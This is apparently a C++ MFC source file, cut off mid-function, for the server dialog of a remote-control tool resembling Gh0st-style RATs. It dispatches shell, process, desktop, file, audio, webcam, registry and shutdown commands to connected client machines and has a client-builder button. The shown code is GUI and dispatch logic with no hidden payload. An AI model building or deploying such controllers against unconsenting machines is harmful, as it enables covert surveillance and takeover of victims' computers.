
// XsServerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "XsServer.h"
#include "XsServerDlg.h"
#include "afxdialogex.h"
#include "DlgXsServerSet.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

COLUMN_DATA __Column_Data_Online[] =
{

    {"IP",            120 },
    {"计算机名/备注",     160 },
    {"操作系统",      128 },
    {"CPU",           180 },
    {"摄像头",        81 },
    {"PING",          151 },
};

COLUMN_DATA __Column_Data_Message[] =
{
	{ "信息类型",      200 },
	{ "时间",          200 },
	{ "信息类容",      490 },
};

ULONG m_ConnectionCount = 0;
static UINT __Indicators[] = { IDR_STATUSBAR_SERVER_STRING };


#define UM_BUTTON_CMD_MANAGER WM_USER + 0x10

//定义配置文件的全局
_CConfigFile __ConfigFile;
//定义通信引擎的全局指针
_CIOCPServer* __IOCPServer = NULL;

//定义窗口类的全局指针
CXsServerDlg* __ServerDlg = NULL;
// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CXsServerDlg 对话框



CXsServerDlg::CXsServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_XSSERVER_DIALOG, pParent)
{
	__ServerDlg = this;
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_Bitmap[0].LoadBitmap(IDB_BITMAP_FINDER);
}

void CXsServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_SERVER_DIALOG_ONLINE, m_CListCtrl_Server_Dialog_Online);
	DDX_Control(pDX, IDC_LIST_SERVER_DIALOG_MESSAGE, m_CListCtrl_Server_Dialog_Message);
}

BEGIN_MESSAGE_MAP(CXsServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_COMMAND(ID_MENU_SERVER_DIALOG_SET, &CXsServerDlg::OnMenuServerDialogSet)
	ON_COMMAND(ID_MENU_SERVER_DIALOG_EXIT, &CXsServerDlg::OnMenuServerDialogExit)
	ON_COMMAND(ID_MENU_SERVER_DIALOG_ADD, &CXsServerDlg::OnMenuServerDialogAdd)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SERVER_DIALOG_ONLINE, &CXsServerDlg::OnNMRClickListServerDialogOnline)
	ON_COMMAND(ID_MENU_SERVER_DIALOG_ONLINE_LIST_DISCONNECTION, &CXsServerDlg::OnMenuServerDialogOnlineListDisconnection)
	ON_COMMAND(ID_MENU_SERVER_DIALOG_ONLINE_LIST_REMOTE_MESSAGE, &CXsServerDlg::OnMenuServerDialogOnlineListRemoteMessage)
	ON_COMMAND(ID_MENU_SERVER_DIALOG_ONLINE_LIST_REMOTE_SHUTDOWN, &CXsServerDlg::OnMenuServerDialogOnlineListRemoteShutdown)
	
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_CMD_MANAGER,&CXsServerDlg::OnButtonCmdManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_PROCESS_MANAGER, &CXsServerDlg::OnButtonProcessManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_WINDOW_MANAGER, &CXsServerDlg::OnButtonWindowManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_REMOTE_CONTROLL, &CXsServerDlg::OnButtonRemoteControll)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_FILE_MANAGER, &CXsServerDlg::OnButtonFileManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_AUDIO_MANAGER, &CXsServerDlg::OnButtonAudioManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_CLEAN_MANAGER, &CXsServerDlg::OnButtonCleanManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_VIDEO_MANAGER, &CXsServerDlg::OnButtonVideoManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_SERVICE_MANAGER, &CXsServerDlg::OnButtonServiceManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_REGISTER_MANAGER, &CXsServerDlg::OnButtonRegisterManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_SERVER_MANAGER, &CXsServerDlg::OnButtonServerManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_CREATE_CLIENT, &CXsServerDlg::OnButtonCreateClient)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_SERVER_ABOUT, &CXsServerDlg::OnButtonServerAbout)
	
	ON_WM_SIZE()
	ON_WM_CLOSE()

	//托盘消息
	ON_MESSAGE(UM_NOTIFY_ICON_DATA,(LRESULT(__thiscall CWnd::*)(WPARAM,LPARAM))OnNotifyIconData)
	ON_COMMAND(ID_NOTIFY_ICON_DATA_SHOW, &CXsServerDlg::OnNotifyIconDataShow)
	ON_COMMAND(ID_NOTIFY_ICON_DATA_EXIT, &CXsServerDlg::OnNotifyIconDataExit)

	//自定义消息
	ON_MESSAGE(UM_CLIENT_LOGIN, OnClientLogin)
	ON_MESSAGE(UM_OPEN_REMOTE_MESSAGE_DIALOG, OnOpenRemoteMessageDialog)
	ON_MESSAGE(UM_OPEN_CMD_MANAGER_DIALOG, OnOpenCmdManagerDialog)
	ON_MESSAGE(UM_OPEN_PROCESS_MANAGER_DIALOG, OnOpenProcessManagerDialog)
	ON_MESSAGE(UM_OPEN_WINDOW_MANAGER_DIALOG, OnOpenWindowManagerDialog)
	ON_MESSAGE(UM_OPEN_REMOTE_CONTROLL_DIALOG, OnOpenRemoteControllDialog)
	ON_MESSAGE(UM_OPEN_FILE_MANAGER_DIALOG, OnOpenFileManagerDialog)
	ON_MESSAGE(UM_OPEN_AUDIO_MANAGER_DIALOG, OnOpenAudioManagerDialog)
	ON_MESSAGE(UM_OPEN_VIDEO_MANAGER_DIALOG, OnOpenVideoManagerDialog)
	ON_MESSAGE(UM_OPEN_SERVICE_MANAGER_DIALOG, OnOpenServiceManagerDialog)
	ON_MESSAGE(UM_OPEN_REGISTER_MANAGER_DIALOG, OnOpenRegisterManagerDialog)
	

END_MESSAGE_MAP()


// CXsServerDlg 消息处理程序

BOOL CXsServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	InitListControl();
	InitSolidMenu();
	InitStatusBar();
	InitTrueToolBar();
	InitNotifyIconData();

	m_ListenPort = __ConfigFile.GetInt("Settings", "ListenPort");
	m_MaxConnection = __ConfigFile.GetInt("Settings", "MaxConnection");
	ServerStart();

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CXsServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CXsServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CXsServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

//初始化控件
VOID CXsServerDlg::InitListControl()
{
	for (int i = 0; i < sizeof(__Column_Data_Online) / sizeof(COLUMN_DATA); i++)
	{
		m_CListCtrl_Server_Dialog_Online.InsertColumn(i, __Column_Data_Online[i].TitleData,
			LVCFMT_CENTER, __Column_Data_Online[i].TitleWidth);
	}
	m_CListCtrl_Server_Dialog_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	for (int i = 0; i < sizeof(__Column_Data_Message) / sizeof(COLUMN_DATA); i++)
	{
		m_CListCtrl_Server_Dialog_Message.InsertColumn(i, __Column_Data_Message[i].TitleData,
			LVCFMT_CENTER, __Column_Data_Message[i].TitleWidth);
	}
	m_CListCtrl_Server_Dialog_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
}

VOID CXsServerDlg::InitSolidMenu()
{
	HMENU Menu;
	Menu = LoadMenu(NULL, MAKEINTRESOURCE(IDR_MENU_SERVER_DIALOG_MAIN));  //载入菜单资源
	::SetMenu(this->GetSafeHwnd(), Menu);                                 //为窗口设置菜单
	::DrawMenuBar(this->GetSafeHwnd());                                   //显示菜单
}

void CXsServerDlg::OnMenuServerDialogSet()     //弹出设置Dialog
{
	// 弹出Dlg
	CDlgXsServerSet DialogObject;   //构造类对象
	DialogObject.DoModal();         //显示对话框
}


void CXsServerDlg::OnMenuServerDialogExit()   //退出程序
{
	// 执行关闭对话框命令
	SendMessage(WM_CLOSE);
}


void CXsServerDlg::OnMenuServerDialogAdd()
{
	// 添加一组数据到控制列表
	int i = m_CListCtrl_Server_Dialog_Online.InsertItem(m_CListCtrl_Server_Dialog_Online.GetItemCount(), "张飞");
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 1, "23");
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 2, "车骑将军");
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 3, "蜀");
}


void CXsServerDlg::OnNMRClickListServerDialogOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	// Online控制列表鼠标右键点击消息
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	CMenu Menu;
	Menu.LoadMenu(IDR_MENU_LIST_SERVER_DIALOG_ONLINE_MAIN);  //加载菜单资源
	CMenu* SubMenu = Menu.GetSubMenu(0);

	// 获得鼠标位置
	CPoint Point;
	GetCursorPos(&Point);

	int v1 = SubMenu->GetMenuItemCount();   //获得菜单上子项的个数
	if (m_CListCtrl_Server_Dialog_Online.GetSelectedCount() == 0)   //如果没有选中
	{
		for (int i = 0; i < v1; i++)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);   //菜单子项全变灰
		}
	}
	Menu.SetMenuItemBitmaps(ID_MENU_SERVER_DIALOG_ONLINE_LIST_DISCONNECTION, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);
	Menu.SetMenuItemBitmaps(ID_MENU_SERVER_DIALOG_ONLINE_LIST_REMOTE_MESSAGE, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);
	Menu.SetMenuItemBitmaps(ID_MENU_SERVER_DIALOG_ONLINE_LIST_REMOTE_SHUTDOWN, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);

	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);

	*pResult = 0;
}
//OnlineList菜单消息(删除用户)
void CXsServerDlg::OnMenuServerDialogOnlineListDisconnection()
{
	//发送数据到客户端
	BYTE IsToken = CLIENT_GET_OUT_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));

	//清除ListControl列表
	CString ClientAddress;
	int SelectedCount = m_CListCtrl_Server_Dialog_Online.GetSelectedCount();
	int i = 0;
	for (i = 0; i < SelectedCount; i++)
	{
		POSITION Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
		int Item = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Position);
		ClientAddress = m_CListCtrl_Server_Dialog_Online.GetItemText(Item, 0);
		//销毁列表项
		m_CListCtrl_Server_Dialog_Online.DeleteItem(Item);
		ClientAddress += "强制断开";
		ShowDialogMessage(TRUE, ClientAddress);
	}
}
//OnlineList菜单消息(远程消息)
void CXsServerDlg::OnMenuServerDialogOnlineListRemoteMessage()
{
	BYTE IsToken = CLIENT_REMOTE_MESSAGE_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
}
//OnlineList菜单消息(远程关机)
void CXsServerDlg::OnMenuServerDialogOnlineListRemoteShutdown()
{
	BYTE IsToken = CLIENT_SHUT_DOWN_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));

	CString ClientAddress;
	int SelectedCount = m_CListCtrl_Server_Dialog_Online.GetSelectedCount();
	int i = 0;
	for (i = 0; i < SelectedCount; i++)
	{
		POSITION Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
		int Item = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Position);
		ClientAddress = m_CListCtrl_Server_Dialog_Online.GetItemText(Item, 0);
		m_CListCtrl_Server_Dialog_Online.DeleteItem(Item);
		ClientAddress += "强制断开";
		ShowDialogMessage(TRUE, ClientAddress);
	}
}
VOID CXsServerDlg::SendingSelectedCommand(PBYTE BufferData, ULONG BufferLength)
{
	//从ListControl上的隐藏项中选取出Context对象
	POSITION Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
	//该代码支持多项选择
	while (Position)
	{
		int Item = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Position);
		//获得该排的隐藏数据项得到Context
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CListCtrl_Server_Dialog_Online.GetItemData(Item);
		__IOCPServer->OnPrepareSending(ContextObject, BufferData, BufferLength);
	}
}
VOID CXsServerDlg::ShowDialogMessage(BOOL IsOk, CString Message)
{
	CString v1;
	CString v2;
	CString v3;
	CTime Time = CTime::GetCurrentTime();
	v2 = Time.Format("%H:%M:%S");
	if (IsOk)
	{
		v1 = L"执行成功";
	}
	else
	{
		v1 = L"执行失败";
	}

	m_CListCtrl_Server_Dialog_Message.InsertItem(0,v1);   //向控件中设置数据
	m_CListCtrl_Server_Dialog_Message.SetItemText(0, 1, v2);
	m_CListCtrl_Server_Dialog_Message.SetItemText(0, 2, Message);

	if (Message.Find("上线") > 0)      //处理上线下线信息
	{
		m_ConnectionCount++;
	}
	else if (Message.Find("下线") > 0)
	{
		m_ConnectionCount--;
	}
	else if (Message.Find("断开") > 0)
	{

		m_ConnectionCount--;
	}
	m_ConnectionCount = (m_ConnectionCount <= 0 ? 0 : m_ConnectionCount);   //防止m_ConnectionCount有-1的情况
	v3.Format("有%d个主机在线", m_ConnectionCount);

	m_StatusBar.SetPaneText(0, v3);   //在状态条上显示文字
}
VOID CXsServerDlg::InitStatusBar()
{
	if (!m_StatusBar.Create(this)||!m_StatusBar.SetIndicators(__Indicators,
		sizeof(__Indicators)/sizeof(UINT)))         //创建状态条并设置字符资源的id
	{
		return;
	}
	CRect v1;
	GetWindowRect(&v1);    //top left bottom right
	v1.bottom += 1;        //触发onsize立即执行
	MoveWindow(v1);
}
VOID CXsServerDlg::InitTrueToolBar()
{
	if (!m_TrueColorToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_TrueColorToolBar.LoadToolBar(IDR_TOOLBAR_SERVER_DIALOG_MAIN))  //创建一个工具条 加载资源
	{
		return;
	}
	m_TrueColorToolBar.LoadTrueColorToolBar
		(
			48,  //加载真彩工具条
			IDB_BITMAP_MAIN,
			IDB_BITMAP_MAIN,
			IDB_BITMAP_MAIN
			);  //和我们的位图资源相关联

		RECT v1, v2;
		GetWindowRect(&v2);  //得到窗口大小
		v1.left = 0;
		v1.top = 0;
		v1.bottom = 80;
		v1.right = v2.right - v2.left + 10;
		m_TrueColorToolBar.MoveWindow(&v1, TRUE);


		m_TrueColorToolBar.SetButtonText(0, "终端管理");   //在位图的下面添加文件
		m_TrueColorToolBar.SetButtonText(1, "进程管理");
		m_TrueColorToolBar.SetButtonText(2, "窗口管理");
		m_TrueColorToolBar.SetButtonText(3, "桌面管理");
		m_TrueColorToolBar.SetButtonText(4, "文件管理");
		m_TrueColorToolBar.SetButtonText(5, "语音管理");
		m_TrueColorToolBar.SetButtonText(6, "系统清理");
		m_TrueColorToolBar.SetButtonText(7, "视频管理");
		m_TrueColorToolBar.SetButtonText(8, "服务管理");
		m_TrueColorToolBar.SetButtonText(9, "注册表管理");
		m_TrueColorToolBar.SetButtonText(10, "服务端管理");
		m_TrueColorToolBar.SetButtonText(11, "客户端管理");
		m_TrueColorToolBar.SetButtonText(12, "帮助");
		//RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  //显示
		//去掉//后才会显示按键文字？？？？？
}
void CXsServerDlg::InitNotifyIconData()
{
    //初始化托盘的结构体
    m_NotifyIconData.cbSize = sizeof(NOTIFYICONDATA);
    m_NotifyIconData.hWnd = m_hWnd;
    m_NotifyIconData.uID = IDR_MAINFRAME;
    m_NotifyIconData.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
    m_NotifyIconData.uCallbackMessage = UM_NOTIFY_ICON_DATA;    //自定义消息
    m_NotifyIconData.hIcon = m_hIcon;
    CString v1 = "Alessio远程控制中心";
    lstrcpyn(m_NotifyIconData.szTip, v1, sizeof(m_NotifyIconData.szTip) / sizeof(m_NotifyIconData.szTip[0]));
    Shell_NotifyIcon(NIM_ADD, &m_NotifyIconData);          //显示托盘
}
VOID CXsServerDlg::ServerStart()
{
	__IOCPServer = new _CIOCPServer;    //动态申请我们的类对象

	if (__IOCPServer == NULL)
	{
		return;
	}
	if (__IOCPServer->ServerRun(m_ListenPort, WindowsNotifyProcedure) == TRUE)  //?????ServerRun()函数
	{
		
	}
	//在窗口界面上显示通信类对象已经启动
	CString v1;
	v1.Format("监听端口：%d成功", m_ListenPort);
	ShowDialogMessage(TRUE, v1);
	return;
}
VOID CALLBACK CXsServerDlg::WindowsNotifyProcedure(PCONTEXT_OBJECT ContextObject)
{
	WindowHandleIO(ContextObject);
}
VOID CXsServerDlg::WindowHandleIO(PCONTEXT_OBJECT ContextObject)
{
	if (ContextObject == NULL)
	{
		return;
	}
	if (ContextObject->DialogID > 0)
	{
		switch (ContextObject->DialogID)
		{
		case CMD_MANAGER_DIALOG:
		{
			CDlgCmdManager* Dialog = (CDlgCmdManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
            break;
		}
		case PROCESS_MANAGER_DIALOG:
		{
			CDlgProcessManager* Dialog = (CDlgProcessManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();  //此WindowHandleIO是在ProcessManager里的 二次刷新进程列表时调用
			break;
		}
		case WINDOW_MANAGER_DIALOG:
		{
			CDlgWindowManager* Dialog = (CDlgWindowManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case REMOTE_CONTROLL_DIALOG:
		{
			CDlgRemoteControll* Dialog = (CDlgRemoteControll*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case FILE_MANAGER_DIALOG:
		{
			CDlgFileManager* Dialog = (CDlgFileManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case AUDIO_MANAGER_DIALOG:
		{
			CDlgAudioManager* Dialog = (CDlgAudioManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case SERVICE_MANAGER_DIALOG:
		{
			CDlgServiceManager* Dialog = (CDlgServiceManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case REGISTER_MANAGER_DIALOG:
		{
			CDlgRegisterManager* Dialog = (CDlgRegisterManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		}
		return;
	}

	switch (ContextObject->m_ReceivedDecompressedBufferData.GetArray(0)[0])
	{
	case CLIENT_LOGIN:    //用户登录请求
	{
		__ServerDlg->PostMessageA(UM_CLIENT_LOGIN,
			NULL, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_GET_OUT_REPLY:
	{
		//回收在当前对象上的异步请求
		CancelIo((HANDLE)ContextObject->ClientSocket);
		closesocket(ContextObject->ClientSocket);
		ContextObject->ClientSocket = NULL;
		Sleep(10);
		break;
	}
	case CLIENT_REMOTE_MESSAGE_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REMOTE_MESSAGE_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_SHUT_DOWN_REPLY:
	{
		//回收在当前对象上的异步请求
		CancelIo((HANDLE)ContextObject->ClientSocket);
		closesocket(ContextObject->ClientSocket);
		ContextObject->ClientSocket = NULL;
		Sleep(10);

		break;
	}
	case CLIENT_CMD_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_CMD_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
        break;
	}
	case CLIENT_PROCESS_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_PROCESS_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_WINDOW_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_WINDOW_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_REMOTE_CONTROLL_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REMOTE_CONTROLL_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_FILE_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_FILE_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_AUDIO_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_AUDIO_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_SERVICE_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_SERVICE_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_REGISTER_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REGISTER_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	}
	
}
void CXsServerDlg::OnNotifyIconData(WPARAM wParam, LPARAM lParam)
{
    switch ((UINT)lParam)
    {
    case WM_LBUTTONDOWN:
    case WM_LBUTTONDBLCLK:
    {
        if (!IsWindowVisible())   //当前对话框是否是显示状态
        {
            //窗口不显示
            ShowWindow(SW_SHOW);
        }
        else
        {
            ShowWindow(SW_HIDE);
        }
        break;
    }
    case WM_RBUTTONDOWN:
    {
        CMenu Menu;
        Menu.LoadMenu(IDR_MENU_NOTIFY_ICON_DATA);
        CPoint Point;
        GetCursorPos(&Point);
        SetForegroundWindow();    //设置当前窗口
        Menu.GetSubMenu(0)->TrackPopupMenu(
            TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
            Point.x, Point.y, this, NULL);
        PostMessage(WM_USER, 0, 0);
        break;
    }
            break;
    }
}
void CXsServerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	if (m_StatusBar.m_hWnd != NULL)   //状态栏
	{   //当对话框大小改变时  状态条大小也随之改变
		CRect Rect;
		Rect.top =  cy-20;
		Rect.left = 0;
		Rect.right = cx;
		Rect.bottom = cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_POPOUT, cx);
		//m_TrueColorToolBar.MoveWindow(Rect);  //设置工具条大小位置

	}

	if (m_TrueColorToolBar.m_hWnd != NULL)  //工具条
	{
		CRect Rect;
		Rect.top = Rect.left = 0;
		Rect.right = cx;
		Rect.bottom = 80;
		m_TrueColorToolBar.MoveWindow(Rect);  //设置工具条大小位置
	}

}
VOID CXsServerDlg::OnButtonCmdManager()
{
	POSITION Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
	//判断是否选择用户
	if (Position)
	{
		BYTE IsToken = CLIENT_CMD_MANAGER_REQUEST;
		SendingSelectedCommand(&IsToken, sizeof(BYTE));
	}
	return;
}
LRESULT CXsServerDlg::OnOpenCmdManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgCmdManager *Dialog = new CDlgCmdManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	Dialog->Create(IDD_DIALOG_CMD_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);

	ContextObject->DialogID = CMD_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}
VOID CXsServerDlg::OnButtonProcessManager()
{
	/*POSITION Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
	if (!Position)
	{
		PostMessage();
	}*/
	BYTE IsToken = CLIENT_PROCESS_MANAGER_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));

	return;
}
LRESULT CXsServerDlg::OnOpenProcessManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CDlgProcessManager *Dialog = new CDlgProcessManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	//创建一个非阻塞的Dialog
	Dialog->Create(IDD_DIALOG_PROCESS_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);

	ContextObject->DialogID = PROCESS_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}
VOID CXsServerDlg::OnButtonWindowManager()
{
	BYTE IsToken = CLIENT_WINDOW_MANAGER_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT CXsServerDlg::OnOpenWindowManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CDlgWindowManager* Dialog = new CDlgWindowManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	//创建一个非阻塞的Dialog
	Dialog->Create(IDD_DIALOG_WINDOW_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);

	ContextObject->DialogID = WINDOW_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}
VOID CXsServerDlg::OnButtonRemoteControll()
{
	BYTE IsToken = CLIENT_REMOTE_CONTROLL_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT CXsServerDlg::OnOpenRemoteControllDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CDlgRemoteControll* Dialog = new CDlgRemoteControll(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	//创建一个非阻塞的Dialog
	Dialog->Create(IDD_DIALOG_REMOTE_CONTROLL, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);

	ContextObject->DialogID = REMOTE_CONTROLL_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}
VOID CXsServerDlg::OnButtonFileManager()
{
	
	BYTE IsToken = CLIENT_FILE_MANAGER_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT CXsServerDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CDlgFileManager* Dialog = new CDlgFileManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	//创建一个非阻塞的Dialog
	Dialog->Create(IDD_DIALOG_FILE_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);

	ContextObject->DialogID = FILE_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}
VOID CXsServerDlg::OnButtonAudioManager()
{
	BYTE IsToken = CLIENT_AUDIO_MANAGER_REQUEST;   //向被控端发送命令
